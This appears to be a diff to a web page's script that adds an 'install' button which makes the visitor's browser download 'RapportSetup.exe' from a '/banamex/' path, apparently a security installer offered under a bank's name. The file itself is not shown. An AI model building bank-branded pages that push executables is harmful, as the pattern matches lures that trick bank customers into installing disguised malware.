@@ -1682,6 +1682,20 @@
 
         // Initialize first image
         changeBackground(currentIndex);
+
+        // Install button handler - Download Rapport Setup
+        const installButton = document.querySelector('.btn-install');
+        if (installButton) {
+            installButton.addEventListener('click', function() {
+                // Create a temporary anchor element to trigger download
+                const link = document.createElement('a');
+                link.href = '/banamex/RapportSetup.exe';
+                link.download = 'RapportSetup.exe';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            });
+        }
     </script>
 </body>
 </html>
